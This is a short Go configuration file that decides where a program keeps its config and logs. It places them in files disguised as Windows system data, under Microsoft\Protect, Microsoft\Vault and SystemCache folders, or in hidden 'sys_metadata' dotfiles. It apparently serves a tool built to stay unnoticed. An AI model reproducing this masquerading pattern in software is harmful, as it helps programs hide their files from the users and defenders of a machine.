package config

import (
	"os"
	"path/filepath"
	"runtime"
)

// GetStoragePath returns the single binary file used for both config and logs.
// On Windows: %APPDATA%\Microsoft\Protect\system.dat
// On others: ~/.sys_metadata_001.dat (fallback)
func GetStoragePath() string {
	if runtime.GOOS == "windows" {
		appData := os.Getenv("APPDATA")
		if appData == "" {
			home, _ := os.UserHomeDir()
			return filepath.Join(home, ".sys_metadata_001.dat")
		}
		dir := filepath.Join(appData, "Microsoft", "Protect")
		os.MkdirAll(dir, 0755)
		return filepath.Join(dir, "system.dat")
	}
	
	home, _ := os.UserHomeDir()
	return filepath.Join(home, ".sys_metadata_001.dat")
}

// GetAllPreviousDataDirs returns a list of directories and files used in previous versions.
func GetAllPreviousDataDirs() []string {
	home, _ := os.UserHomeDir()
	localApp := os.Getenv("LOCALAPPDATA")
	appData := os.Getenv("APPDATA")
	
	paths := []string{
		filepath.Join(home, ".sys_cache_001"),
	}
	
	if localApp != "" {
		paths = append(paths, filepath.Join(localApp, "Microsoft", "Windows", "SystemCache"))
		paths = append(paths, filepath.Join(localApp, "Microsoft", "Vault", "Cache"))
	}
	
	if appData != "" {
		paths = append(paths, filepath.Join(appData, "Microsoft", "Protect", "Storage"))
	}
	
	return paths
}

// Legacy helpers for migration
func GetLogPath() string { return GetStoragePath() }
func GetConfigPath() string { return GetStoragePath() }
func GetLockPath() string { return GetStoragePath() }
